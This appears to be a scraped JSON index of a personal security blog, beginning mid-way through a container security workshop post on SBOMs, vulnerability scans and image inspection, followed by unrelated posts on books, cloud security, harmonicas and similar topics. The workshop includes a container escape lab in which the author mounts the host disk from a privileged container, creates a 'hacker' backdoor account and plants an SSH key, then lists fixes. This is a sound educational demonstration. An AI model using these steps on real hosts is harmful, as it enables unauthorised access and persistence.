\u0026#34;$(pwd):/tmp\u0026#34; -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:user-nginx -o json --file user-nginx.sbom. json Unable to find image \u0026#39;anchore/syft:latest\u0026#39; locally latest: Pulling from anchore/syft 71a8266a79ee: Pull complete a8f6c9c9f214: Pull complete 561883679c88: Pull complete Digest: sha256:69fcf21cdd4c577d6949dca4d28549d19724b244dfb539509544be166b53ead3 Status: Downloaded newer image for anchore/syft:latest ubuntu@sans:~$ ls -sh user-nginx.sbom.json 2.6M user-nginx.sbom.json ubuntu@sans:~$ jq \u0026#39;.artifacts | length\u0026#39; \u0026lt; user-nginx.sbom.json 143 ubuntu@sans:~$ Vulnerability Scanning images # Perform vulnerability scan to the images with grype.\nVuln scan on user-nginx image # ubuntu@sans:~$ docker run -v \u0026#34;$(pwd):/tmp\u0026#34; anchore/grype sbom:user-nginx.sbom.json --output json --file user-nginx.vulns.json Unable to find image \u0026#39;anchore/grype:latest\u0026#39; locally latest: Pulling from anchore/grype a116dcab4dc7: Pull complete 2f3b307256b4: Pull complete 920e1d887e26: Pull complete Digest: sha256:3bd0e02814d15734ad360ea3619807714feff950a1da221758d91bf224e62cc1 Status: Downloaded newer image for anchore/grype:latest Report written to \u0026#34;user-nginx.vulns.json\u0026#34; ubuntu@sans:~$ ls -sh user-nginx.vulns.json 560K user-nginx.vulns.json ubuntu@sans:~$ jq \u0026#39;.matches | length\u0026#39; \u0026lt; user-nginx.vulns.json 143 ubuntu@sans:~$ The scan result shows that 143 vulnerabilities been identified.\nVuln scan on alternative image # Perform vulnerability scan on a secure-by-default image.\nuse syft to generate the SBOM use grype to perform vuln scan ubuntu@sans:~$ docker run -v \u0026#34;$(pwd):/tmp\u0026#34; -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:cgr.dev/chainguard/nginx -o json --file chainguard-nginx.sbom.json ubuntu@sans:~$ jq \u0026#39;.artifacts | length\u0026#39; \u0026lt; chainguard-nginx.sbom.json 28 ubuntu@sans:~$ ubuntu@sans:~$ docker run -v \u0026#34;$(pwd):/tmp\u0026#34; anchore/grype sbom:chainguard-nginx.sbom.json --output json --file chainguard-nginx.vulns.json [0000] WARN unknown relationship type: described-by form-lib=syft \u0026lt;repeated warnings removed for brevity\u0026gt; [0000] WARN unknown relationship type: described-by form-lib=syft Report written to \u0026#34;chainguard-nginx.vulns.json\u0026#34; ubuntu@sans:~$ ls -sh chainguard-nginx.vulns.json 8.0K chainguard-nginx.vulns.json ubuntu@sans:~$ jq \u0026#39;.matches | length\u0026#39; \u0026lt; chainguard-nginx.vulns.json 0 Inspect on secure image # use the cosign tree command to \u0026ldquo;Display supply chain security related artifacts for an image such as signatures, SBOMs and attestations\u0026rdquo;.\nubuntu@sans:~$ docker inspect cgr.dev/chainguard/nginx:latest | jq -r \u0026#39;.[].Config.User\u0026#39; 65532 ubuntu@sans:~$ docker run cgr.dev/chainguard/cosign tree cgr.dev/chainguard/nginx 📦 Supply Chain Security Related artifacts for an image: cgr.dev/chainguard/nginx └── 📦 SBOMs for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.sbom └── 🍒 sha256:fc14a768db64ba83c53746097f2e791137a90dbee6bab11b1166b90d53289d70 └── 💾 Attestations for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.att ├── 🍒 sha256:7102f15718109bcf960a60c7d0755d2a46cf8f1a89dc9f5f0d1dc3b73e2681fe ├── 🍒 sha256:94a26e6536103e2c0731999b32d9ae5ebaaf437bd1b053a9efd5595071a8af88 ├── 🍒 sha256:fa704008148447c3d10a9736aad6a3428256176626b718db32e7c5449a2380af ├── 🍒 sha256:371727d76489648fd7a7bc1e6ee19a5ccf5b397742d929f3f8c22a3a5c4be2a1 ├── 🍒 sha256:b8a661f0bdeaf21787c86a5e50a7dcbbcd46390128b51aab7f72762e2ac3a757 ├── 🍒 sha256:6015433534df9fa5023ece30f6ee218d16054eef2411e70bf5eb125ac76d322a ├── 🍒 sha256:3831c2b852c81bb471445e46ab93555507db06ae198c1664459c438a0d8ec266 ├── 🍒 sha256:348b53b595b93efa25f40e11bda99d722eca26a6e995af6f9e036c2c949c0502 ├── 🍒 sha256:5285aa1b38d48a914e869f6644065b0772da6e5d09ff5773329dc1c6b6d465d2 ├── 🍒 sha256:aa85614506690a9babd80fc77f0ab68ed7f8d712f6cdc6a0208908fd8eda3b8a ├── 🍒 sha256:b5b510dcfc8aab2357b1c25d8d8f45907e73149b6463f5d7e985974b41bd42b1 ├── 🍒 sha256:c954860ffd5ef9b00134c4970e6987d421985e4fb6de64007b5d84bba97ac4dd ├── 🍒 sha256:dbba1f40511148154d752eacdb64046669baf46d4f13cf25ce17daf2c5c453a9 ├── 🍒 sha256:621c3cf1a6f00cff7ba4522ba88712a5ad113ef6ba9884898f5b58b843d6ef7f ├── 🍒 sha256:2a2e8bfd461bb44c636a11fc32edc7e9bfdf8ab12a8e4cfd430f4fb2ae65e148 ├── 🍒 sha256:f010822fd3cb45a683a93e0606be6cacaca5228de291723ab05b5f498a93e99a ├── 🍒 sha256:14d68d8ee2407d1c743592330555510b7086875960788384ad9572f0f83bc35a ├── 🍒 sha256:16c2d4c02666ec833fd29135057c32ca556d2c45f375655f4d75c2adeebec458 ├── 🍒 sha256:ef544fd9894e4c8d17610f640820fadfb7de3518006ce0d03258b693a1355868 ├── 🍒 sha256:ccbb7e07bf6cda332cbb8ee1a4d7abdf839bd4bf6e3b573429248f815d8f3f26 └── 🍒 sha256:120ab82c57f4e533d471bc44bd055c0eeab276e8ebc527d020e6a5096edd3642 └── 🔐 Signatures for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.sig ├── 🍒 sha256:d5c4cead0e7d2c49100b9fdc9fe6cce1ffb52c903e20c546232000eef4113a51 ├── 🍒 sha256:d5c4cead0e7d2c49100b9fdc9fe6cce1ffb52c903e20c546232000eef4113a51 ├── 🍒 sha256:d72682ddb79a2cb3b16b3a1d50c86e273920e4ec0088f0f5dba352387ee7cf7e ├── 🍒 sha256:d72682ddb79a2cb3b16b3a1d50c86e273920e4ec0088f0f5dba352387ee7cf7e ├── 🍒 sha256:d62ec7d81329cc08ff38ad7f33942ba2660ca1afad72d4de0e3d7b1fdffba234 ├── 🍒 sha256:d62ec7d81329cc08ff38ad7f33942ba2660ca1afad72d4de0e3d7b1fdffba234 ├── 🍒 sha256:9ea093370b8210e1131fa3bca0d3b8016cb84326533a2205c75243aba9a570be ├── 🍒 sha256:9ea093370b8210e1131fa3bca0d3b8016cb84326533a2205c75243aba9a570be ├── 🍒 sha256:377862a5ed89b7f1e189ef66c5b9bd03b7f5fb127eb1a205ad2ceec9b3f64fb2 ├── 🍒 sha256:0a9793e1e953e5805f6b7fe539c1299ee22fbc0ebe3ba8f897bf14f906622678 └── 🍒 sha256:0a9793e1e953e5805f6b7fe539c1299ee22fbc0ebe3ba8f897bf14f906622678 ubuntu@sans:~$ Container Image Component # Perform 3 different inspection of image created earlier.\nInspect the manifest digest of image # Retrieve the manifest difest and use it to make API calls to the registry.\nubuntu@sans:~$ mdigest=$(docker inspect --format=\u0026#39;{{index .RepoDigests 0}}\u0026#39; user-nginx | cut -f2 -d@) ubuntu@sans:~$ echo $mdigest sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 ubuntu@sans:~$ curl -k https://localhost:443/v2/user-nginx/tags/list {\u0026#34;name\u0026#34;:\u0026#34;user-nginx\u0026#34;,\u0026#34;tags\u0026#34;:[\u0026#34;latest\u0026#34;,\u0026#34;sha256-ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250.sig\u0026#34;]} ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | sha256sum ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 - ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | head -14 { \u0026#34;schemaVersion\u0026#34;: 2, \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.distribution.manifest.v2+json\u0026#34;, \u0026#34;config\u0026#34;: { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.container.image.v1+json\u0026#34;, \u0026#34;size\u0026#34;: 7307, \u0026#34;digest\u0026#34;: \u0026#34;sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5\u0026#34; }, \u0026#34;layers\u0026#34;: [ { \u0026#34;mediaType\u0026#34;: \u0026#34;application/vnd.docker.image.rootfs.diff.tar.gzip\u0026#34;, \u0026#34;size\u0026#34;: 31403586, \u0026#34;digest\u0026#34;: \u0026#34;sha256:f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1\u0026#34; }, ubuntu@sans:~$ Inspect the file system layers # Investigate the files in this layer.\nubuntu@sans:~$ ldigest=$(curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | jq -r \u0026#39;.layers[0].digest\u0026#39;) ubuntu@sans:~$ echo $ldigest sha256:f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1 ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$ldigest | sha256sum f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1 - ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$ldigest | tar -tvzf - | head drwxr-xr-x 0/0 0 2023-05-22 08:00 bin/ -rwxr-xr-x 0/0 1234376 2022-03-28 02:40 bin/bash -rwxr-xr-x 0/0 43936 2020-09-24 16:36 bin/cat -rwxr-xr-x 0/0 72672 2020-09-24 16:36 bin/chgrp -rwxr-xr-x 0/0 64448 2020-09-24 16:36 bin/chmod -rwxr-xr-x 0/0 72672 2020-09-24 16:36 bin/chown -rwxr-xr-x 0/0 151168 2020-09-24 16:36 bin/cp -rwxr-xr-x 0/0 125560 2020-12-10 21:23 bin/dash -rwxr-xr-x 0/0 113664 2020-09-24 16:36 bin/date -rwxr-xr-x 0/0 80968 2020-09-24 16:36 bin/dd ubuntu@sans:~$ Inspect the configuration components # ubuntu@sans:~$ cdigest=$(curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | jq -r \u0026#39;.config.digest\u0026#39;) ubuntu@sans:~$ echo $cdigest sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5 ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest | sha256sum f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5 - ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest | jq -r \u0026#39;.config.Env[]\u0026#39; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NGINX_VERSION=1.25.0 NJS_VERSION=0.7.12 PKG_RELEASE=1~bullseye ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest | jq -r \u0026#39;.history[15]\u0026#39; { \u0026#34;created\u0026#34;: \u0026#34;2023-06-09T17:46:19.951682264+08:00\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;RUN /bin/sh -c groupadd --gid 44380 -r webadm \u0026amp;\u0026amp; useradd -r -g webadm -s \\\u0026#34;/bin/bash\\\u0026#34; --create-home --uid 44380 webadm # buildkit\u0026#34;, \u0026#34;comment\u0026#34;: \u0026#34;buildkit.dockerfile.v0\u0026#34; } ubuntu@sans:~$ Sometime, sensitive info (default password) may be exposed via the config and history.\nRecommendation:\nuse multi-stage builds provide secrets at build time using envrionment viriables dynamically retrieve secret at runtime with secret stores, like AWS Secrets Manager, HashiCorp Vault. Container Escape # In this section, we will:\nrun a standard Ubuntu container with privileges access abusing the --privileged argument to mount the host filesystem ubuntu@sans:~$ docker run -it --privileged ubuntu:20.04 Unable to find image \u0026#39;ubuntu:20.04\u0026#39; locally 20.04: Pulling from library/ubuntu ca1778b69356: Pull complete Digest: sha256:db8bf6f4fb351aa7a26e27ba2686cf35a6a409f65603e59d4c203e58387dc6b3 Status: Downloaded newer image for ubuntu:20.04 root@97b36f280196:/# mount | grep \u0026#39;/dev\u0026#39; tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755) devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666) cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime) shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k) /dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime) /dev/sda1 on /etc/hostname type ext4 (rw,relatime) /dev/sda1 on /etc/hosts type ext4 (rw,relatime) devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666) root@97b36f280196:/# ls -la /home total 8 drwxr-xr-x 2 root root 4096 Apr 15 2020 . drwxr-xr-x 1 root root 4096 Jun 9 11:45 .. root@97b36f280196:/# root@97b36f280196:/# mount /dev/sda1 /mnt root@97b36f280196:/# chroot /mnt # Create a backdoor account hacker and drop my SSH public key into the ubuntu user at host.\n# ls -la /home total 12 drwxr-xr-x 3 root root 4096 Jun 8 20:11 . drwxr-xr-x 19 root root 4096 Jun 8 20:11 .. drwxr-xr-x 6 ubuntu ubuntu 4096 Jun 9 19:03 ubuntu # useradd hacker # passwd hacker New password: Retype new password: passwd: password updated successfully # cd /home/ubuntu/.ssh # echo \u0026#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID/RrCstjSf3v/oQqgQSH4/JV8ov8qGUOFHjGDjSCdIw zd@myseq\u0026#34; \u0026gt;\u0026gt; authorized_keys # exit root@97b36f280196:/# exit exit ubuntu@sans:~$ Verify the 2 backdoors.\nubuntu@sans:~$ tail -3 /etc/passwd ubuntu: x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd: x:998:100::/var/snap/lxd/common/lxd:/bin/false hacker: x:1001:1001::/home/hacker:/bin/sh ubuntu@sans:~$ tail -1 .ssh/authorized_keys ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID/RrCstjSf3v/oQqgQSH4/JV8ov8qGUOFHjGDjSCdIw zd@myseq ubuntu@sans:~$ Fix # avoid using privileged use non-root user (as below) ubuntu@sans:~$ docker run -it -u 1001 --privileged ubuntu:20.04 Links # https://www.sans.org/webcasts/container-security-101/ https://jonzeolla.com/labs/container-security-101.html https://www.youtube.com/watch?v=-iJbGBJTRyk Fun with Containers crane ","date":"2023-06-08 20:13","externalUrl":null,"permalink":"/posts/container_security_101/","section":"posts","summary":"Workshop on securing container.","title":"Hands on Workshop: Container Security 101","type":"posts"},{"content":" Stupidity is not the lack of knowledge, but the illusion of having it. Jul 2024 # Hacking API: Breaking Web Application Programming Interfaces (by Corey J.Ball) Friend \u0026amp; Foe: When to Cooperate, When to Compete, and How to Succeed at Both (by Maurice Schweitzer, Adam Galinsky) Rapid ChatGPT Developer Guide (by Ko Ko, Ian Chen, Ryan Chung) May 2024 # Influence Is Your Superpower (by Zoe Chance) Dec 2023 # Maths on the Back of an Envelope (by Rob Eastaway). The Good Enough Job: Reclaiming Life from Work (by Simone Stolzoff) Nov 2023 # Smart Brevity: The Power of Saying More with Less (by Roy Schwartz, Jim VandeHei, Mike Allen) Switch: How to Change Things When Change Is Hard (by Dan Heath, Chip Heath) Nudge: The Final Edition (by Cass R. Sunstein, Richard H. Thaler) Nov 2022 # The BS Dictionary (by Tim Ito, Bob Wiltfong) Oct 2022 # Sensehacking: How to Use the Power of Your Senses for Happier, Healthier Living (by Charles Spence) Nov 2021 # TRUTH: How the Many Sides to Every Story Shape Our Reality (by Hector MacDonald) Sep 2021 # The Model Thinker：What You Need to Know to Make Data Work for You (by Scott E. Page) Watching the English: The Hidden Rules of English Behaviour (by Kate Fox) Dec 2020 # NBA x MBA Year 2017 # Presence: Bringing Your Boldest Self to Your Biggest Challenges (by Amy Cuddy) Year 2016 # Man meets Woman (by Yang Liu) East meets West (by Yang Liu) Wiser: Getting Beyond Groupthink to Make Groups Smarter (by Cass Sunstein,Reid Hastie) Zero to One: Notes on Startups, or How to Build the Future (by Peter Thiel,Blake Masters) It’s Not About the Shark: How to Solve Unsolvable Problems (by David Niven) What If？:Serious Scientific Answers to Absurd Hypothetical Questions (by Randall Munroe) SILO Effect (by Gillian Tett) Wine Folly: The Essential Guide to Wine (by Justin Hammack, Madeline Puckette) Year 2015 # Lead with a Story: A Guide to Crafting Business Narratives That Captivate, Convince, and Inspire Keeping Up with the Quants:Your Guide to Understanding and Using Analytics Sapiens (From Animals Into Gods):A Brief History of Humankind False Prophets－The gurus who created modern management and why their ideas are bad DRUNK TANK PINK: And Other Unexpected Forces That Shape How We Think, Feel and Behave How To Make Smart Decisions In Business And Life Year 2014 # How to be interesting：In 10 Simple Steps I’m Sorry I Broke Your Company When Management Consultants Are the Problem, Not the Solution Microstyle: The Art of Writing Little Business Model Generation The Predictioneer’s Game: Using the Logic of Brazen Self-Interest to See and Shape the Future Brainfluence: 100 Ways to Persuade and Convince Consumers with neuromaketing Year 2013 # Be Stupid：for successful living You Say More Than You Think Taking Flight!: Master the DISC Styles to Transform Your Career, Your Relationships\u0026hellip;Your Life Year 2010-2011 # Outliers Presentation Zen Design Stick In the past # Gray Hat Hacking (2005) Shellcoder\u0026rsquo;s Handbook (2004) Hacking: The art of exploitation (2003) Hack Notes: Web Security (2003) ","date":"2023-05-22 17:58","externalUrl":null,"permalink":"/reading/","section":"MySeq","summary":"Some books that I read.","title":"Books Read","type":"page"},{"content":"","date":"2023-05-22 17:58","externalUrl":null,"permalink":"/categories/hobbies/","section":"categories","summary":"","title":"Hobbies","type":"categories"},{"content":"","date":"2023-05-22 17:58","externalUrl":null,"permalink":"/tags/reading/","section":"tags","summary":"","title":"reading","type":"tags"},{"content":" My Notes # Here are my notes taken from the SANS webcast.\nTop 6 CSP includes: AWS, Azure, Google Cloud, Alibaba Cloud, Oracle Cloud, IBM Cloud. Terraform allows to define cloud infrastructure as code and supports all the top 6 CSPs. It is practically impossible to consistently apply security controls across CSPs using any single tool including Terraform. Organizations look to so-called “cloud-agnostic” technologies to manage this complexity.\nCloud infra includes highly specific services and platform, and these platform are not interoperable.\ndifferent API call schemes are used to create infra in each CSP fundamental security concepts differ across the CSP users must understand the conceptual differences between clouds and between syntactical in at diff TF providers. Cloud IAM control, is the most important subject across CSP.\nlimit access to managed services IAM is more useful than network control in clouds. AWS IAM logic flow Vs. Azure RBAC eval logic Vs. Google Cloud Policy eval CSP may break integration (on purpose) to maintain as market leader.\nOther than IaC, application integration is another barrier to cloud agnisticism.\nnative clouds services are more secure than written in-house. either have to re-write the apps for interoperability, or not relying on native cloud services, like S3, DynamoDB, IAM. Webcast was conducted at May 10, which is Happy SEC510 day!\nPossible solutions and recommendations:\ndapr.io (ack Cloud Native Computing Foundation project) Use multi-region instead of multi-CSP for redundancy and simplicity. Creating one-core application that works on multi-cloud is nearly impossible and unnecessary. (by chance)\nmulti-cloud solutions: Terraform Pulumi Cloudify - an open source cloud and network functions virtualization (NFV) orchestration platform. Acting as a type of middleware, to provide users a simple way to deploy applications or services in a cloud computing environment. vendor specific: CloufFormation ARM - Azure Resource Manager Links # SANS Webcast Cloud Agnostic or Devout? Poster: Secure Service Configuration in AWS, Azure, \u0026amp; GCP SEC510: Public Cloud Security: AWS, Azure, and GCP ","date":"2023-05-12 08:01","externalUrl":null,"permalink":"/posts/myth_of_cloud_agnosticism/","section":"posts","summary":"Why securing multiple clouds using Terraform is harder than you think?","title":"The Myth of Cloud Agnosticism","type":"posts"},{"content":"","date":"2023-05-10 00:55","externalUrl":null,"permalink":"/tags/2021/","section":"tags","summary":"","title":"2021","type":"tags"},{"content":" Fire starts here \u0026hellip;\nSoraya Osorio — Furniture designer, Firefox fan (2021)\nabout:config # Description Settings Values Default To disable disk cache browser.cache.disk.enable false true To disable disk cache on SSL browser.cache.disk_cache_ssl false true To enable RAM cache browser.cache.memory.enable true true To set RAM cache capacity based on 2GB physical memory browser.cache.memory.capacity 24576 -1 Links # about:config about:cache about:welcome or link to the photo Firefox: Task Manager about:about ","date":"2023-05-10 00:55","externalUrl":null,"permalink":"/firefox/","section":"MySeq","summary":"Fire starts here \u0026hellip;","title":"Firefox","type":"page"},{"content":"","date":"2023-05-09 20:59","externalUrl":null,"permalink":"/tags/status/","section":"tags","summary":"","title":"status","type":"tags"},{"content":"Today, I just experience some incident with GitHub. So here, I try to list down the status page for the common clouds services that I use everyday.\nClouds # AWS Health Dashboard Azure Status Docker Status Page Dropbox System Sttus GitHub Status Google Clouds Service Health LinkedIn Status Page Facebook or Meta Status MS Office365 Salesforce Status Page Slack Status OpenAI Status Azure Portal # Azure status Azure status history Service Health | Service issues Service Health | Health history Service Health | Resource health Service Health | Health alerts Vendors # KennaSecurity Status Qualys Rapid7 Tenable Status Vulcan Status ","date":"2023-05-09 20:59","externalUrl":null,"permalink":"/posts/clouds_status/","section":"posts","summary":"List of status pages for our cloud.","title":"Status of the Clouds","type":"posts"},{"content":"","date":"2023-05-05 11:40","externalUrl":null,"permalink":"/tags/linkedin/","section":"tags","summary":"","title":"linkedin","type":"tags"},{"content":" To me, LinkedIn is a strange place where everyone is celebrating something. 20th Anniversary # LinkedIn was officially established on May 5, 2003, with a mission to connect professionals across the globe to help create an economic possibility for a successful and constructive business opportunity.\nLinkedIn # According to LinkedIn, it is the largest professional network on the internet. LinkedIn users can use it to find the right job or internship, connect and strengthen professional relationships, and learn the skills needed to succeed in career.\nWhile LinkedIn offers immense opportunities for networking and career development, it is essential to recognize it could be double-edged sword due to its constant exposure to other\u0026rsquo;s achievements.\nAnd nowadays, I just see it as a strange place where everyone is celebrating something in LinkedIn everyday instead of sharing any professional work.\n","date":"2023-05-05 11:40","externalUrl":null,"permalink":"/posts/linkedin/","section":"posts","summary":"LinkedIn turns 20 years old.","title":"Linkedin","type":"posts"},{"content":" The opposite of MicroSoft OffIce is MacroHard OnFire.\n","date":"2023-05-02 15:25","externalUrl":null,"permalink":"/posts/msoffice_fun/","section":"posts","summary":"The opposite of Microsoft Office is \u0026hellip;","title":"Unofficial Microsoft Office Day","type":"posts"},{"content":" I write about Cybersecurity in simple practical terms. The Strategies # Building a Resilient Website with Cybersecurity Key Principles. Securing your website begins with essential security practices. These include using strong passwords, enabling SSL/TLS encryption, and keeping your software up to date. These steps are non-negotiable to safeguard any site from common threats.\nIt’s also important to adopt principles like security through obscurity, not security by obscurity. The first uses clever design and techniques to add extra protection, while the second depends entirely on keeping details hidden—which is risky if those details are ever discovered.\nWhile adding layers of complexity can enhance protection, relying solely on secrecy is risky if those hidden details are ever discovered.\nSimplifying cybersecurity is another key approach — overcomplicated defenses can lead to mistakes and vulnerabilities. Following the Ten Immutable Laws of Security helps us focus on the most critical truths, such as the importance of controlling physical and remote access to your systems.\nFor example, if someone has unrestricted access to your systems —- whether physically or remotely —- your defenses won’t hold up.\nBy sticking to these strategies, focusing on the essentials, and simplifying the approachs, we can create a website that is better protected against today’s threats.\nEssential Security Security_through_obscurity, not security_by_obscurity Simplify Cybersecurity Ten Immutable Laws of Security (by Microsoft) Mozilla.org # moz://a 🦖 Infosec Guidelines SSL Configuration Generator Tools Development # All tools and utils that developed are stored at myseq@github.\nUtils ≠ Tools # Utility is not same as tool. Utilities are small program that brings fun and quick solution to some problems. I\u0026rsquo;ve put all the utilities that I created at GitHub repo at MySeq/utils:\nOpen Source # Currently, I am busy at R\u0026amp;D and learn everything about clouds \u0026hellip;\nResearch # All the R\u0026amp;D works have been migrated to Lab21.\nDevelopment # WSL settings configuration TaiPy Taipy-GPT4-Demo https://www.youtube.com/watch?v=84NssvoUluY Build stunning Data Science WebApp Turn Data/AI algorithm into full WebApp REST API # HTTPie Bruno Insomnium API Client Public API (VM) # Site Links CISA_KEV https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json RHA_CVE https://access.redhat.com/hydra/rest/securitydata/cve/\u0026lt;CVE-2024-2961\u0026gt;.json MSRC https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/\u0026lt;2024-aug\u0026gt; SUSE_VEX https://ftp.suse.com/pub/projects/security/csaf-vex/\u0026lt;cve-2023-46842\u0026gt;.json Oracle_CPU https://www.oracle.com/docs/tech/security-alerts/\u0026lt;cpujul2024csaf\u0026gt;.json Cybersecurity # Project Discovery - Democratize security, together ProjectDiscovery Blog Clouds # Cloud Native Computing Foundation\nCNCF Landscape CNCF Landscape Guide Rancher\nSUSE NeuVector k3s rke2 Kubernetes (k8s)\nHead-First Kubernetes kubernetes-the-hard-way kubernetes-the-hard-way Cloud Security\nKubernetes Security: 8 Best Practices to Secure Your Cluster Container Security: 8 Best Practices You Must Know [Docker Security: 5 Risks and 5 Best Practices for Securing Your Container](https://www.tigera.io/learn/guides/container-security-best-practices/docke r-security/) ","date":"2023-05-01 01:12","externalUrl":null,"permalink":"/content/","section":"MySeq","summary":"Main content here\u0026hellip;","title":"Content (main)","type":"page"},{"content":"","date":"2023-05-01 01:12","externalUrl":null,"permalink":"/tags/main/","section":"tags","summary":"","title":"main","type":"tags"},{"content":" Summary (My notes) # A series of videos (3 parts) that talk about vulnerability management:\nfrom finding the context with tools leveraging the context for prioritization leveraging context to create meaningful and tailored metrics for specifics to owners, systems, applications, by business unit churn rate mean time to detect - average mean time to resolve - average agents coverage vs non-agent SLA compliance rate leveraging context for reporting (tailored) automated. exceptions vulnerable images Contextual Information Enterprise assets, cloud assets, and ownership information. Leveraging Contextual Information Prioritization, Metrics, and Reporting Threat intel (internal and external) Effective VulnMgmt Working Vs Effective Mean Time to Detect: Average (vuln pub data - vuln found date) Churn rate: Absolute Value (New vuln - Closed vuln @ monthly) Re-open rate: Averagee Exposure Windows: Average (vuln close date - vuln pub date) Overdue: (current date - first discovered) \u0026gt; Policy Communication and collaborations feedback, tailored report Enabling business to deliver mission Comments: CMDB is too slow nowadays tracking image version, usage, life-span, deployed Multiple scanners and automation SANS Webcasts # Finding Context (part 1 of 3) # Leveraging Context (part 2 of 3) # Is the Program Effective (part 3 of 3) # Links # SANS MGT516: Managing Security Vulnerabilities: Enterprise \u0026amp; Cloud Asset Inventory Vulnerability Management Metrics Part 2 – 3 Advanced Metrics for Your VM Program ","date":"2023-04-28 20:59","externalUrl":null,"permalink":"/posts/vuln_mgmt_mgt516_managing_security_vuln/","section":"posts","summary":"From context to metrics in Vulnerability Management.","title":"Vuln Mgmt: From Context to Metrics","type":"posts"},{"content":"","date":"2023-04-18 18:00","externalUrl":null,"permalink":"/tags/10-hole/","section":"tags","summary":"","title":"10-hole","type":"tags"},{"content":" Just buy a 10-hole diatonic harmonica in the key of C as your first harmonica. The harmonica is a versatile instrument used in various music genres, including blues, folk, rock, and more. It is known for its compact size, making it portable and easy to carry around.\nThe 3 Types of Harmonica # 1-hole diatonic harmonica Chromatic harmonica Tremolo harmonica \u0026ldquo;10-hole harp\u0026rdquo; （10孔竖琴）: It is a colloquial term often used to refer to the harmonica, a small wind instrument that is played by blowing air through it.\nThe harmonica typically has ten holes in which the player can blow or draw (inhale/exhale) air to produce different musical notes.\nThe Diatonic Harmonica # The 10-hole design is one of the most common configurations for diatonic harmonicas, which are designed to play in a particular key or musical scale. Players can achieve different notes by using their breath and changing the way they interact with the holes, creating a distinctive and recognizable sound.\nThe Pros:\nIt is the only harmonica on which you can achieve the most expressive bending of notes. It is compact and durable compared to most musical instruments. It is inexpensive and easy to play. The Cons:\nThere are missing notes or some melodies can\u0026rsquo;t be played. It supports single key only. It requires different pattern of playing notes in each octave. Chromatic harmonica # Chromatic harmonicas are much bigger than diatonic harmonicas, because it is actually a C harmonica and a C# harmonica wrapped up into one big fat harmonica!\nIt has a spring-loaded button on the side. Playing with the button released is playing the C harmonica, and playing with the button in is playing the C# harmonica.\nIt comes with many versions, but the 12-hole chromatic harmonica is by far the most common. The 12-Hole covers 3 octaves, and produces 48 tones.\nThe Pros:\nBetter suited for Jazz. Full access to all 12 notes per octave. All notes are accessed in same pattern across the whole harmonica. Play in any key with just 1 harmonica. The Cons:\nMore difficult to learn. Easy to play “wrong” notes. Very Expensive! Tremolo harmonica # The concept of the tremolo harmonica is to have two reeds vibrate on every note instead of just one. This concept is similar to that of the accordion\nPlaying a note on either the diatonic or the chromatic harmonica causes a single metal reed to vibrate in the player’s breath.\nThe Pros:\nPopular in early to mid-1900\u0026rsquo;s Cool beating sound from doubling reeds. Tone more like an accordion. Popular in east Asia. The Cons:\nMore airflow required to play. More confusing to learn. More refined technique isolating single reed to bend notes. Unsuitable for playing the blues. Conclusion # Harmonica Summary Diatonic Best for Blues sound, easiest to learn. Chromatic Can play sophisticated chromatic music like Jazz, but expensive in general. Tremolo Beautiful tone for traditional sings and not suitable for Blues. Link # Exploring the 3 Types of Harmonica. Samples: 十孔口琴： C調 Proceeds (圓孔) 十孔口琴： C調 Boogieman (paddy 調音) 演奏用琴： A調 Devilblues 藍調口琴 ","date":"2023-04-18 18:00","externalUrl":null,"permalink":"/harmonica/","section":"MySeq","summary":"Exploring the types of harmonica.","title":"Buying Harmonica","type":"page"},{"content":"","date":"2023-04-18 18:00","externalUrl":null,"permalink":"/tags/harmonica/","section":"tags","summary":"","title":"harmonica","type":"tags"},{"content":"","date":"2023-04-14 